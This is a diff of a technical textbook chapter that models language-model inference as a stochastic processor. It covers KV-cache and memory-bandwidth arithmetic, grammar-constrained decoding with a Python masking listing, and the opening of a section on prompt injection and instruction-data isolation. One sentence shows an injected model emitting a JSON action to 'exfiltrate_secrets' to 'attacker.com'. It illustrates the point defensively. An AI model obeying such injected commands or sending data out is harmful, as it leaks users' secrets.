@@ -11,9 +11,9 @@ In agentic systems, a foundation model does not act as an application or an orac
 \end{marginfigure}
 :::
 
-_Why does an autoregressive token predictor make an untrusted systems processor?_
+_Why is an autoregressive foundation model best understood as a memory-bandwidth-bound processor core rather than a deterministic CPU or an application script?_
 
-Traditional machine learning models are deployed as static oracles that process isolated inputs and return probabilistic predictions, but when granted memory and tools, they transform into active processors capable of modifying production environments. If systems engineers treat a stochastic neural network as a drop-in replacement for a deterministic central processing unit, the resulting runtime inevitably collapses into semantic livelocks and unchecked compounding errors. Because neural models cannot reliably separate code from data in a unified token buffer, traditional hardware isolation guarantees dissolve. To safely harness probabilistic engines without succumbing to their fundamental unreliability, systems architects must treat them as volatile compute units that require strict external governance. In agentic systems, the runtime must co-design the neural policy proposal engine with deterministic execution boundaries.
+At the center of an autonomous agentic computing system sits the foundation model. If systems engineers treat this model as a standard software application or an all-knowing oracle, the system fails to account for the physical realities of silicon and probability. In reality, an autoregressive neural network operates as a stochastic processor core: it executes a continuous fetch-decode-execute cycle where token embeddings are retrieved from memory, transformed through attention and feed-forward layers, and sampled into action proposals. While the underlying accelerator silicon (logic gates, ALUs, and Tensor Cores) is a deterministic physical state machine, the neural processor behaves stochastically because its execution terminates in an algorithmic sampling kernel over a continuous probability simplex—further perturbed by the non-associativity of parallel floating-point reductions across GPU thread blocks. Furthermore, because it interleaves instructions and untrusted data in a single token stream, it operates without hardware privilege separation. This chapter formalizes the Stochastic Processor Contract, analyzing the microarchitectural physics, memory bandwidth walls, and runtime interfaces required to harness a probabilistic neural core as the central compute engine of an autonomous system.
 
 ::: {.content-visible when-format="pdf"}
 \newpage
@@ -51,6 +51,14 @@ To a systems architect, this atomic step represents a direct neural analog of th
 3. **Execute and Stochastic Branch (EX)**: Rather than following a deterministic opcode, the execution unit applies sampling operators (temperature scaling, top-$p$, or grammar-derived logit masks) to evaluate the probability simplex and stochastically select the next token $y_t$.
 4. **Writeback and Commit (WB)**: The newly sampled token $y_t$ is appended to the context buffer, its key and value projections are committed to the key-value (KV) cache in high-bandwidth memory (HBM), and the program counter in the Agent Control Block advances ($t \leftarrow t + 1$).
 
+@Fig-stochastic-processor-core formalizes this four-stage microarchitectural pipeline. Notice that while a classical CPU pipeline operates on bit-exact discrete registers, the neural processor couples a memory-bound linear algebra pipeline (IF and ID) to a probabilistic sampling and logit-masking engine (EX and WB).
+
+::: {#fig-stochastic-processor-core fig-env="figure" fig-pos="htb" fig-cap="**The Stochastic Processor: Instruction Fetch-Decode-Execute-Writeback Pipeline**: Microarchitectural decomposition of the autoregressive forward pass. The pipeline advances across four atomic stages: (1) Instruction Fetch retrieves the active context prefix and previous token $y_{t-1}$; (2) Neural Decode propagates activations through $L$ transformer layers over HBM weight matrices to emit unnormalized logits $\mathbf{z}_t$; (3) Execute & Branch applies grammar-derived boolean logit masks and sampling operators; and (4) Writeback & Commit appends $y_t$ to working context, materializes new KV projections in physical HBM, and advances the Agent Control Block watchdog program counter." fig-alt="Four-stage architectural pipeline diagram illustrating Instruction Fetch, Neural Decode, Execute and Stochastic Branch, and Writeback and Commit with hardware memory bindings."}
+
+![](images/svg/stochastic_processor_core.svg){width="100%"}
+
+:::
+
 Under the hood, this forward pass decomposes into three primary computational stages: token embedding and positional encoding at the input, $L$ repeating transformer layers (each executing multi-head attention and a position-wise feed-forward network), and the final vocabulary projection. Each stage exhibits a distinct arithmetic intensity and, consequently, a distinct hardware bottleneck.
 
 ### Token embedding and positional encoding
@@ -84,7 +92,7 @@ where $b_{\text{elem}}$ is the byte width of each stored element (2 bytes for BF
 - Under legacy Multi-Head Attention ($H_{\text{KV}} = H_Q = 64$), @eq-kv-cache-memory evaluates to $2 \times 80 \times 64 \times 128 \times 32{,}768 \times 2 \approx 85.9\text{ GB}$ — a quantity that completely exhausts the 80 GB HBM3 capacity of a single NVIDIA H100 SXM5 GPU before a single weight byte is loaded.
 - Under modern Grouped-Query Attention (GQA, as deployed in Llama 3 70B with $H_{\text{KV}} = 8$), the KV cache memory footprint drops by an exact factor of 8 to $10.74\text{ GB}$ (or $328\text{ KB/token}$ across all layers), making multi-turn trajectory execution physically viable on production accelerators.
 
-During the decode phase, the attention computation for a single new token against an existing context of length $t$ performs $4 H_Q d_{\text{head}} t$ multiply-accumulate operations while reading $2 H_{\text{KV}} d_{\text{head}} t \cdot b_{\text{elem}}$ bytes from the KV cache and $d_{\text{model}}^2 \cdot b_{\text{elem}}$ bytes from projection weight matrices. Under MHA ($H_{\text{KV}} = H_Q$), the resulting arithmetic intensity across the attention sublayer is bounded by:
+During the decode phase, the attention computation for a single new token against an existing context of length $t$ performs $4 H_Q d_{\text{head}} t$ floating-point operations (FLOPs: $2 H_Q d_{\text{head}} t$ for the $QK^T$ inner product and $2 H_Q d_{\text{head}} t$ for the attention-value projection $AV$) while reading $2 H_{\text{KV}} d_{\text{head}} t \cdot b_{\text{elem}}$ bytes from the KV cache and $d_{\text{model}}^2 \cdot b_{\text{elem}}$ bytes from projection weight matrices. Under MHA ($H_{\text{KV}} = H_Q$), the resulting arithmetic intensity across the attention sublayer is bounded by:
 
 $$
 \mathcal{I}_{\text{attn}} \approx \frac{4 H d_{\text{head}} t}{2 H d_{\text{head}} t \cdot b_{\text{elem}}} = \frac{2}{b_{\text{elem}}},
@@ -100,7 +108,7 @@ $$
 \text{FFN}(\mathbf{h}) = \phi\!\left(\mathbf{h} \mathbf{W}_1\right) \mathbf{W}_2,
 $$ {#eq-ffn-forward}
 
-In @eq-ffn-forward, $\mathbf{W}_1 \in \mathbb{R}^{d_{\text{model}} \times d_{\text{ff}}}$, $\mathbf{W}_2 \in \mathbb{R}^{d_{\text{ff}} \times d_{\text{model}}}$, and $\phi$ is a nonlinear activation such as SiLU or GELU. With the standard ratio $d_{\text{ff}} = 4 d_{\text{model}}$, the weight matrices of a single FFN layer for $d_{\text{model}} = 8192$ occupy approximately 2.1 GB per layer in BF16. For a single-token decode pass, the matrix multiplications $\mathbf{h} \mathbf{W}_1$ and $\mathbf{h} \mathbf{W}_2$ each have the shape $(1 \times d_{\text{model}}) \times (d_{\text{model}} \times d_{\text{ff}})$ — degenerate matrix-vector products, not matrix-matrix products. The arithmetic intensity of a matrix-vector multiply of dimensions $(1 \times m) \times (m \times n)$ is
+In @eq-ffn-forward, $\mathbf{W}_1 \in \mathbb{R}^{d_{\text{model}} \times d_{\text{ff}}}$, $\mathbf{W}_2 \in \mathbb{R}^{d_{\text{ff}} \times d_{\text{model}}}$, and $\phi$ is a nonlinear activation such as SiLU or GELU. With the standard ratio $d_{\text{ff}} = 4 d_{\text{model}}$, the weight matrices of a single FFN layer for $d_{\text{model}} = 8192$ contain $2 \times (8192 \times 32{,}768) = 536{,}870{,}912$ parameters, occupying exactly $1.07\text{ GB}$ per layer in BF16 (or approximately $1.41\text{ GB}$ per layer in modern SwiGLU architectures utilizing three matrices $\mathbf{W}_{\text{gate}}, \mathbf{W}_{\text{up}}, \mathbf{W}_{\text{down}}$ with $d_{\text{ff}} = \frac{8}{3}d_{\text{model}}$). For a single-token decode pass, the matrix multiplications $\mathbf{h} \mathbf{W}_1$ and $\mathbf{h} \mathbf{W}_2$ each have the shape $(1 \times d_{\text{model}}) \times (d_{\text{model}} \times d_{\text{ff}})$ — degenerate matrix-vector products, not matrix-matrix products. The arithmetic intensity of a matrix-vector multiply of dimensions $(1 \times m) \times (m \times n)$ is
 
 $$
 \mathcal{I}_{\text{gemv}} = \frac{2mn}{(m \cdot n + m + n) \cdot b_{\text{elem}}} \approx \frac{2}{b_{\text{elem}}},
@@ -124,10 +132,26 @@ The runtime of an agentic inference system must maintain structured state across
 - **Tool invocation log**: A time-ordered record of tool calls emitted by prior steps, their arguments, and their returned observations, enabling the runtime to splice observation tokens into the active context without reprocessing prefix segments unnecessarily.
 - **Step counter and budget**: The current value of $t$, the maximum permitted generation length $T_{\max}$, and any token-budget soft constraints imposed by the orchestration layer.
 
-The runtime execution context is not merely bookkeeping metadata; it is the live execution state of the system. Its memory footprint scales linearly with context length through the KV cache term, and its integrity is a precondition for correct resumption after preemption, migration, or partial generation restart. Systems that treat runtime context as an afterthought — serializing it lazily or evicting it under memory pressure without a coherent replacement policy — exhibit the class of collapse behaviors described in the opening trace of this section: generation proceeds, latency degrades silently, and no surface-level metric captures the root cause until throughput collapses entirely. The execution lifecycle of an agent context is governed by the deterministic state transitions diagrammed in @fig-vol3-processor-acb-fsm.
+The execution lifecycle of an agent context is governed by the deterministic state transitions diagrammed in @fig-vol3-processor-acb-fsm.
 
 ::: {#fig-vol3-processor-acb-fsm fig-env="figure" fig-pos="htb" fig-cap="**The Agent Control Block (ACB) Finite State Machine**: Runtime lifecycle transitions, accelerator memory management triggers, and compensating rollback paths governing autonomous agent execution. The runtime transitions between active accelerator forward passes (`ACTIVE_PREFILL` and `ACTIVE_DECODE`) and external sandbox execution (`SUSPENDED_TOOL_WAIT`). To eliminate accelerator idleness during extended tool execution, an out-of-band watchdog triggers asynchronous DMA transfer to host memory (`SUSPENDED_SWAPPED`), releasing High-Bandwidth Memory frames until the external tool returns." fig-alt="Nine-state finite state machine diagram detailing deterministic transitions between initialized, active prefill, active decode, tool wait, swapped host memory, human approval gate, checkpointing, and compensating rollback states."}
 ![](images/svg/acb_lifecycle_state_machine.svg){width="100%"}
+:::
+
+To mitigate memory-bandwidth bottlenecks and prevent stalled tool calls from stranding HBM capacity during ACB lifecycle suspension, production runtimes organize context storage across the multi-tier hierarchy diagrammed in @fig-vol3-processor-memory-hierarchy.
+
+::: {#fig-vol3-processor-memory-hierarchy fig-env="figure" fig-pos="htb" fig-cap="**Multi-Tier KV-Cache Memory Hierarchy and Context Swapping**: Hardware hierarchy relieving the Tool-Wait Memory Tax across accelerator and host storage tiers. Active decoding occurs exclusively in Tier 1 (GPU HBM3e, 3.35 TB/s), where idle KV cache blocks incur severe economic penalties during prolonged tool calls. By orchestrating asynchronous DMA transfers over PCIe Gen5 (64 GB/s unidirectional, 128 GB/s bidirectional), the runtime swaps dormant context blocks to Tier 2 (Host DDR5) or Tier 3 (NVMe SSD), restoring active accelerator capacity for concurrent serving." fig-alt="Three-tier memory hierarchy diagram showing GPU HBM3e, Host DDR5 DRAM / CXL, and Local NVMe SSD tiers connected via bidirectional PCIe Gen5 DMA channels for tool-wait KV cache eviction and prefetching."}
+![](images/svg/acb_memory_swapping.svg){width="100%"}
+:::
+
+::: {.callout-note title="Context swapping break-even economics"}
+While swapping dormant KV cache blocks out of HBM resolves the Tool-Wait Memory Tax, it introduces a physical latency trade-off governed by PCIe interconnect bandwidth. For a 70B model with GQA ($H_{\text{KV}} = 8$) and an active context of $32{,}768$ tokens, the KV cache occupies $10.74\text{ GB}$. Over a PCIe Gen5 $\times 16$ interconnect operating at $64\text{ GB/s}$ unidirectional bandwidth ($128\text{ GB/s}$ bidirectional aggregate), asynchronous DMA eviction requires $10.74\text{ GB} / 64\text{ GB/s} \approx 168\text{ ms}$. Restoring this context upon tool completion requires a symmetric $168\text{ ms}$ prefetch, establishing a minimum round-trip swapping penalty of:
+
+$$
+T_{\text{swap}}^{\text{round-trip}} = 2 \times \frac{M_{\text{KV}}}{B_{\text{PCIe}}} \approx 336\text{ ms}.
+$$
+
+If an external tool returns in $50\text{--}100\text{ ms}$ (such as a local in-memory cache lookup or regex match), synchronously evicting the context induces an unnecessary $236\text{ ms}$ latency penalty. Context swapping is economically justified only under two operational regimes: (1) when external tool latency substantially exceeds the transfer threshold ($T_{\text{tool}} \gg T_{\text{swap}}^{\text{round-trip}}$, typical of network API calls, bash compilations, or human approval gates), or (2) when memory pressure under high concurrent batch demand threatens to trigger out-of-memory preemption for active decode tokens. Production runtimes (such as vLLM's `BlockManager`) implement an out-of-band watchdog that defers eviction until an ACB tool call exceeds an empirical hysteresis window (typically $\tau_{\text{hysteresis}} \approx 200\text{ ms}$).
 :::
 
 ### The decode arithmetic intensity ceiling
@@ -144,17 +168,19 @@ where $F_{\text{total}}$ is the total floating-point operation count per step an
 At $\mathcal{I}_{\text{decode}} \approx 1$ FLOPs/byte, a single-request decode pass on an H100 SXM5 is capped at approximately 3.35 TFLOP/s by HBM3 bandwidth — not by the 989 TFLOP/s BF16 tensor-core throughput. Tensor-core utilization during single-request decode is typically below 1 percent. Architectural improvements that increase FLOPs/second without proportionally increasing memory bandwidth do not improve single-request decode latency.
 :::
 
-To mitigate this memory-bandwidth bottleneck and prevent stalled tool calls from stranding HBM capacity, production runtimes organize context storage across the multi-tier hierarchy diagrammed in @fig-vol3-processor-memory-hierarchy.
-
-::: {#fig-vol3-processor-memory-hierarchy fig-env="figure" fig-pos="htb" fig-cap="**Multi-Tier KV-Cache Memory Hierarchy and Context Swapping**: Hardware hierarchy relieving the Tool-Wait Memory Tax across accelerator and host storage tiers. Active decoding occurs exclusively in Tier 1 (GPU HBM3e, 3.35 TB/s), where idle KV cache blocks incur severe economic penalties during prolonged tool calls. By orchestrating asynchronous DMA transfers over PCIe Gen5 (64 GB/s), the runtime swaps dormant context blocks to Tier 2 (Host DDR5) or Tier 3 (NVMe SSD), restoring active accelerator capacity for concurrent serving." fig-alt="Three-tier memory hierarchy diagram showing GPU HBM3e, Host DDR5 DRAM / CXL, and Local NVMe SSD tiers connected via bidirectional PCIe Gen5 DMA channels for tool-wait KV cache eviction and prefetching."}
-![](images/svg/acb_memory_swapping.svg){width="100%"}
-:::
-
 ::: {.callout-note title="Prefill vs. decode arithmetic intensity"}
 During the *prefill* phase — the initial parallel processing of a prompt of length $S$ — the query tensor has shape $(S \times d_{\text{model}})$ and the matrix multiplications become matrix-matrix products of intensity $\mathcal{I}_{\text{prefill}} \approx S / b_{\text{elem}}$. For $S = 2048$ and BF16, this evaluates to 1024 FLOPs/byte, placing prefill firmly in the compute-bound regime and fully engaging tensor cores. A single model therefore operates in two qualitatively distinct performance regimes across the lifecycle of one request. Agentic systems that interleave long tool-observation injections with decode generation cycle between these regimes at request boundaries, complicating profiling and capacity planning considerably.
 :::
 
-The autoregressive step formalized here — its intensity ceiling, its ACB state, and its layer-by-layer structure — constitutes the irreducible compute primitive on which all higher-level agentic abstractions are built. Scheduling policies, memory management strategies, and reliability mechanisms discussed throughout this chapter operate on collections of these steps; none can escape the constraint imposed by @eq-decode-intensity. The memory-bandwidth wall is not an engineering oversight to be optimized away; it is a consequence of the algebraic structure of autoregressive generation and the physical properties of current HBM technology, and any rigorous treatment of agentic system performance must begin from this foundation.
+@Fig-vol3-processor-prefill-decode contrasts these two operating regimes on modern accelerator hardware.
+
+::: {#fig-vol3-processor-prefill-decode fig-env="figure" fig-pos="htb" fig-cap="**The Two Inference Regimes: Prefill vs. Decode**: Radically distinct hardware bottlenecks governing prompt evaluation and autoregressive token generation. While the initial prompt prefill phase is compute-bound (saturating tensor cores via dense GEMM at high arithmetic intensity $\mathcal{I}_{\text{prefill}} \gg 100\text{ FLOP/byte}$), autoregressive decode is strictly memory-bandwidth-bound (executing GEMV at $\mathcal{I}_{\text{decode}} \sim 1\text{ FLOP/byte}$, stranding over 99 percent of peak tensor compute)." fig-alt="Two-panel architectural diagram contrasting compute-bound Phase 1 context prefill utilizing dense GEMM at over 100 FLOP/byte against memory-bandwidth-bound Phase 2 autoregressive decode utilizing GEMV at approximately 1 FLOP/byte."}
+
+![](images/svg/prefill_vs_decode.svg){width="100%"}
+
+:::
+
+The autoregressive step formalized here—its memory-bandwidth ceiling defined by @eq-decode-intensity, its live ACB state, and its multi-tier memory footprint—constitutes the physical substrate of agentic computing. Yet completing this memory-bound forward pass resolves only half the execution contract. Unlike a deterministic CPU whose ALU emits an exact register bit pattern, the neural forward pass terminates in an unnormalized score vector over a 128,000-element vocabulary. To understand how these continuous activations are transformed into discrete, executable actions—and why identical hardware inputs do not yield identical results—we must next examine the mathematics and physical non-determinism of the Stochastic Execution Contract.
 
 ::: {#chk-vol3-02-arithmetic-intensity-acb .callout-checkpoint title="Decode intensity and live execution state"}
 
@@ -269,7 +295,15 @@ Under these three conditions, the execution contract transitions from a *stochas
 The appropriate mental model for a language model inference call is not a deterministic function $f: \mathcal{X} \to \mathcal{Y}$, but a stochastic kernel $P(y \mid x)$ that is itself subject to hardware-induced perturbation. Agentic systems that require deterministic behavior must implement it as an overlay — through explicit outcome verification, majority voting (@sec-vol3-intro-the-reliability-wall), or constrained decoding — rather than relying on the substrate to deliver it. The stochastic execution contract is a physical invariant, not a configuration parameter.
 :::
 
-The formalization developed in this section underpins every reliability mechanism examined in the remainder of this chapter. Entropy bounds govern the sample complexity of verification schemes; approximate replay constraints determine the feasibility of audit logging; and the non-associativity of floating-point reduction sets a hard floor on the reproducibility that any production deployment can claim. These are not implementation details — they are the physics of stochastic silicon.
+These entropy bounds and floating-point limits establish a sobering invariant: an unconstrained stochastic processor operates over a support set of tens of thousands of tokens at every step. In an autonomous agent where downstream tools expect rigid, structured protocols—JSON payloads, SQL statements, or typed function calls—drawing tokens from an open probability simplex guarantees that the model will eventually emit a syntactically invalid character, triggering costly retry loops or catastrophic deserialization faults. To build reliable systems on a non-deterministic substrate, the runtime cannot simply hope for high-probability compliance; it must interpose deterministic constraints directly onto the logit vector before sampling occurs. This leads directly to Grammar-Constrained Decoding.
+
+::: {#chk-vol3-02-stochastic-contract .callout-checkpoint title="Stochastic execution contracts and reproducibility"}
+Before examining grammar-constrained decoding, verify your understanding of stochastic execution dynamics:
+
+- [ ] **Parallel reduction non-associativity:** Explain how dynamic thread block scheduling and non-deterministic tree reduction orders in GPU kernels alter the lowest bits of floating-point summations, causing logit divergences across identical hardware runs.
+- [ ] **Path entropy scaling:** If an unconstrained agent trajectory generates 1,024 tokens with average step entropy $\bar{H} = 1.8$ bits, calculate the effective state space $\exp(H_{\text{path}})$. What does this imply for deterministic trajectory replay?
+- [ ] **Three pillars of approximate replay:** Identify the three runtime conditions required to transition an agent from an unconstrained stochastic oracle to an approximately deterministic oracle, and evaluate their throughput penalties.
+:::
 
 ## Grammar-Constrained Decoding & Logit Masking {#sec-vol3-processor-grammar-constrained}
 
@@ -323,6 +357,14 @@ $$ {#eq-kv-cache}
 
 amounting to $16.8\text{ MB}$ per layer. The 16 KB mask transfer per step is five orders of magnitude smaller than the active KV cache footprint and does not compete for HBM bandwidth, which on the H100 peaks at 3.35 TB/s.
 
+This compilation pipeline—from offline schema specification to online token-level masking—is diagrammed in @fig-vol3-processor-grammar-fsm. Production inference engines like Outlines [@willard2023efficient], XGrammar, and vLLM's structured generation backend leverage this architecture to compile arbitrary JSON schemas into compact state tables that execute in microseconds.
+
+::: {#fig-vol3-processor-grammar-fsm fig-env="figure" fig-pos="htb" fig-cap="**Grammar-Constrained Logit Decoding via Finite State Automata (FSMs)**: End-to-end pipeline eliminating syntactic output errors by construction. Ahead-of-time (Panel 1), the compiler transforms a Pydantic tool schema into a regular expression and Deterministic Finite Automaton (DFA). At runtime (Panel 2), the engine queries the current DFA state $q_k$ to construct a dynamic boolean bitmask $\mathbf{m}_k \in \{0, 1\}^{|\mathcal{V}|}$, setting inadmissible logits to $-\infty$ before softmax. This guarantees zero JSON parsing failures (Panel 3), collapsing the multi-turn error retry tax to unity." fig-alt="Three-panel diagram showing ahead-of-time grammar compilation into DFA states, runtime token masking pipeline applying dynamic boolean bitmasks over vocabulary logits, and the elimination of JSON syntax errors."}
+
+![](images/svg/grammar_constrained_decoding_fsm.svg){width="100%"}
+
+:::
+
 ### Vocabulary tokenization misalignment and the boundary artifact
 
 A nontrivial engineering hazard arises from the misalignment between the byte-level structure of a grammar's terminal alphabet and the subword token boundaries of a byte-pair encoding (BPE) vocabulary. A JSON grammar terminal such as the keyword `"true"` may be tokenized as a single token `true` in one vocabulary, as the two-token sequence `tru`, `e` in another, or as the three-token sequence `t`, `ru`, `e` in a character-level fallback. The FSM state must track *byte-level* progress through grammar terminals, not token-level progress, because token boundaries do not align with grammar terminal boundaries in general.
@@ -340,6 +382,143 @@ The operational consequence of correct grammar-constrained decoding is categoric
 The practical consequence for agentic systems is the elimination of the retry-and-validate loop that characterizes unguarded structured generation pipelines. Under naive generation, a pipeline must parse the complete model output, detect violations, and re-invoke the model with a corrective prompt—a sequence that multiplies latency by a factor of $1 + p_{\text{err}} \cdot \bar{k}_{\text{retry}}$ where $p_{\text{err}}$ is the per-request violation rate and $\bar{k}_{\text{retry}}$ is the mean retry count. For a model with $p_{\text{err}} = 0.03$ and $\bar{k}_{\text{retry}} = 2.1$, the multiplier is $1.063$—a 6.3 percent latency tax that compounds multiplicatively across pipeline stages. Grammar-constrained decoding reduces $p_{\text{err}}$ to exactly zero for all constraints expressible in $\mathcal{G}$, collapsing the retry multiplier to unity.
 
 The residual failure modes are precisely those outside the grammar's expressive power: semantic constraints (a date field must be a valid calendar date, not merely a string matching `\d{4}-\d{2}-\d{2}`), cross-field consistency (a start time must precede an end time), and value-range restrictions. These are not context-free properties and cannot be enforced by a PDA over tokens. Enforcing them requires either post hoc validation with targeted correction prompts—a narrowed retry scope—or the integration of semantic constraint solvers into the decoding loop, an active research direction that extends the FSM masking framework to weighted constraint satisfaction. The boundary between what grammar masking can guarantee and what it cannot is itself a systems design contract: the engineer who specifies the grammar specifies exactly the failure surface that remains.
+
+To understand how grammar-constrained decoding operates concretely inside an inference engine, @lst-vol3-processor-grammar-masking implements a functional grammar decoder. The listing illustrates the two core systems components: a byte-level `TokenTrie` that resolves subword vocabulary boundaries to guarantee prefix closure, and a deterministic state transition machine that computes the boolean logit mask $\mathbf{m}_k$ and applies $-\infty$ masking prior to the softmax operator.
+
+::: {#lst-vol3-processor-grammar-masking lst-cap="**Grammar-Constrained Logit Masking Engine**: Python implementation of a schema-driven FSM decoder featuring byte-level prefix-closure matching via a vocabulary trie and dynamic pre-softmax logit masking."}
+```python
+from dataclasses import dataclass, field
+from enum import Enum, auto
+from typing import Dict, List, Optional, Set, Tuple
+import numpy as np
+
+
+class JsonState(Enum):
+    START = auto()
+    OBJECT_OPEN = auto()
+    KEY_START = auto()
+    IN_KEY = auto()
+    KEY_END = auto()
+    COLON = auto()
+    VALUE_STRING = auto()
+    VALUE_NUMBER = auto()
+    COMMA = auto()
+    ACCEPT = auto()
+    ERROR = auto()
+
+
+class TrieNode:
+    """Trie node for token-to-byte prefix matching."""
+    def __init__(self):
+        self.children: Dict[int, "TrieNode"] = {}
+        self.token_ids: Set[int] = set()
+
+
+class TokenTrie:
+    """Prefix trie mapping raw byte sequences to subword vocabulary token IDs."""
+    def __init__(self, vocab: Dict[int, bytes]):
+        self.root = TrieNode()
+        for token_id, token_bytes in vocab.items():
+            node = self.root
+            for b in token_bytes:
+                if b not in node.children:
+                    node.children[b] = TrieNode()
+                node = node.children[b]
+            node.token_ids.add(token_id)
+
+
+class GrammarConstrainedDecoder:
+    """Compiles structured schemas into FSMs and applies dynamic logit masks."""
+
+    def __init__(self, vocab: Dict[int, bytes]):
+        self.vocab = vocab
+        self.vocab_size = len(vocab)
+        self.trie = TokenTrie(vocab)
+
+    def transition(self, state: JsonState, char: str) -> JsonState:
+        """Deterministic FSM state transitions for a minimal JSON schema."""
+        if state == JsonState.START and char == "{":
+            return JsonState.OBJECT_OPEN
+        if state == JsonState.OBJECT_OPEN and char == '"':
+            return JsonState.KEY_START
+        if state == JsonState.KEY_START and char.isalpha():
+            return JsonState.IN_KEY
+        if state == JsonState.IN_KEY and char.isalpha():
+            return JsonState.IN_KEY
+        if state == JsonState.IN_KEY and char == '"':
+            return JsonState.KEY_END
+        if state == JsonState.KEY_END and char == ":":
+            return JsonState.COLON
+        if state == JsonState.COLON and char == '"':
+            return JsonState.VALUE_STRING
+        if state == JsonState.COLON and char.isdigit():
+            return JsonState.VALUE_NUMBER
+        if state == JsonState.VALUE_STRING and char == '"':
+            return JsonState.COMMA
+        if state == JsonState.VALUE_STRING:
+            return JsonState.VALUE_STRING
+        if state == JsonState.VALUE_NUMBER and char.isdigit():
+            return JsonState.VALUE_NUMBER
+        if state == JsonState.VALUE_NUMBER and char == ",":
+            return JsonState.OBJECT_OPEN
+        if state == JsonState.VALUE_NUMBER and char == "}":
+            return JsonState.ACCEPT
+        if state == JsonState.COMMA and char == ",":
+            return JsonState.OBJECT_OPEN
+        if state == JsonState.COMMA and char == "}":
+            return JsonState.ACCEPT
+        return JsonState.ERROR
+
+    def compute_valid_continuations(self, current_state: JsonState) -> Set[int]:
+        """Computes prefix-closed valid tokens via recursive TokenTrie traversal."""
+        valid_tokens: Set[int] = set()
+
+        def dfs(node: TrieNode, state: JsonState):
+            # Tokens whose complete byte sequence terminates at a valid state
+            if state != JsonState.ERROR:
+                valid_tokens.update(node.token_ids)
+            # Prune entire sub-trie if the next byte transition is inadmissible
+            for byte_val, child in node.children.items():
+                next_state = self.transition(state, chr(byte_val))
+                if next_state != JsonState.ERROR:
+                    dfs(child, next_state)
+
+        dfs(self.trie.root, current_state)
+        return valid_tokens
+
+    def step(self, current_state: JsonState, token_id: int) -> JsonState:
+        """Advances the FSM state by consuming the token's byte sequence."""
+        state = current_state
+        for b in self.vocab.get(token_id, b""):
+            state = self.transition(state, chr(b))
+            if state == JsonState.ERROR:
+                break
+        return state
+
+    def apply_logit_mask(
+        self, logits: np.ndarray, current_state: JsonState
+    ) -> np.ndarray:
+        """Transforms raw logits into a strictly grammar-compliant probability distribution."""
+        valid_tokens = self.compute_valid_continuations(current_state)
+        masked_logits = np.full_like(logits, fill_value=-np.inf)
+        if valid_tokens:
+            indices = list(valid_tokens)
+            masked_logits[indices] = logits[indices]
+        return masked_logits
+```
+:::
+
+By compiling formal schemas into deterministic automata and applying pre-softmax bitmasks, the runtime achieves an absolute systems guarantee: every emitted token conforms to the target grammar by construction, eliminating deserialization exceptions and collapsing the error-retry tax to unity.
+
+Yet, this deterministic guarantee carries a dangerous illusion. While an FSM guarantees that an emitted action is syntactically flawless JSON, it provides zero assurance regarding the semantic intent or authorization of that action. A language model governed by a strict grammar will faithfully emit `{"action": "exfiltrate_secrets", "destination": "attacker.com"}` if an adversarial input successfully commands it to do so. The root cause lies not in the output sampler, but at the very entrance of the processor pipeline: large language models process operator instructions and untrusted data in a single, flat token buffer with zero privilege separation. To prevent syntactic correctness from becoming a deterministic vehicle for malicious execution, we must confront the $W \oplus X$ boundary.
+
+::: {#chk-vol3-02-grammar-masking .callout-checkpoint title="Grammar-constrained decoding and pushdown automata"}
+Before examining prompt injection and instruction-data isolation, test your comprehension of constrained decoding mechanics:
+
+- [ ] **Prefix closure requirement:** Explain why a token vocabulary must satisfy byte-level prefix closure when compiling context-free grammars into token-level pushdown automata.
+- [ ] **Memory footprint of transition tables:** For a grammar with 512 parser states and a 128,000-token vocabulary, calculate the host RAM required to store a dense 32-bit integer transition table. Why is this table kept in pinned host memory rather than GPU HBM?
+- [ ] **Syntax vs. semantics:** Why does a grammar-constrained decoding engine provide zero defense against semantic goal hijacking and indirect prompt injection?
+:::
 
 ## Instruction-Data Isolation & The $W \oplus X$ Boundary {#sec-vol3-processor-isolation-boundary}
 
@@ -415,15 +594,25 @@ A genuine $W \oplus X$ equivalent for language models would require that the pro
 
 **Trusted execution environments (TEEs) for prompt isolation** propose encrypting the system prompt under a key held by a hardware security module (HSM) and decrypting it only inside a Trusted Execution Environment such as Intel TDX or ARM CCA [@costan2016intel]. The model receives the decrypted system prompt only after attestation confirms that the execution environment has not been tampered with. This approach enforces system-prompt confidentiality against an untrusted model-serving operator, but it does not address in-context injection: once the decrypted system prompt and the retrieved documents co-inhabit the context window, the token equivalence principle (discussed earlier in this section) reasserts itself.
 
-**Segment-tagged attention masks** extend the attention mask matrix $\mathbf{M} \in \{0, 1\}^{n \times n}$, ordinarily used to enforce causal generation, to additionally block cross-segment attention based on a privilege lattice. Let $s(i) \in \{\text{system}, \text{user}, \text{data}\}$ denote the segment label of token $i$. A privilege mask would enforce $\mathbf{M}_{ij} = 0$ whenever $s(j)$ dominates $s(i)$ in the privilege partial order. This approach is architecturally cleaner than delimiter tokens but requires that segment labels be assigned and verified out-of-band, before the token sequence is assembled, and enforced in the attention kernel rather than by learned weights.
+**Segment-tagged attention masks** extend the attention mask matrix $\mathbf{M} \in \{0, 1\}^{n \times n}$, ordinarily used to enforce causal generation, to additionally regulate cross-segment attention based on a privilege lattice. Crucially, a naive bidirectional mask ($\mathbf{M}_{ij} = 0$) between instruction and data segments destroys functional utility: an instruction such as "Extract the invoice total from the document below" *requires* the instruction and output generation tokens to attend to untrusted data tokens. The privilege lattice must therefore be strictly *asymmetric*: higher-privilege instruction and generated tokens are permitted to read lower-privilege data tokens ($\mathbf{M}_{\text{inst} \to \text{data}} = 1$), but data tokens are structurally forbidden from modifying instruction attention state or injecting control opcodes ($\mathbf{M}_{\text{data} \to \text{inst}} = 0$). This approach is architecturally cleaner than delimiter tokens but requires that segment labels be assigned and verified out-of-band, before the token sequence is assembled, and enforced in the attention kernel rather than by learned weights.
 
-None of these approaches achieves the unconditional, hardware-enforced separation that MMU-based $W \oplus X$ provides for general-purpose processors. The fundamental difficulty is that the transformer attention mechanism is a dense bilinear operator over the entire context; any architectural mechanism that restricts its expressivity to enforce privilege separation necessarily reduces its modeling capacity. Where hardware-enforced token privilege rings remain unattainable within the attention kernel, systems security must be enforced structurally at the agent orchestration boundary via monotonic capability attenuation across delegation trees, as diagrammed in @fig-vol3-processor-capability-attenuation.
